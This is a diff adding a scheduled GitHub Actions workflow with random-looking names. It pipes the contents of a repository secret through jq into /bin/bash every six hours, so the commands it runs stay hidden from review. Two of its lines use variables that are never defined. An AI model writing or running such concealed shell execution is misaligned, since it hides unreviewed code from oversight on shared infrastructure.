@@ -1,0 +1,19 @@
+name: chenjunnanshengs
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chenjunnanshengs
+        env:
+          rcxd65: ${{ secrets.rcxd65 }}
+        run: |
+          echo $rcxd65 | jq -r .x58293 | /bin/bash
+          echo $rtyc25 | jq -r .ignj237 | /bin/bash
+          echo $fbknw354 | jq -r .uxb8 | /bin/bash
+
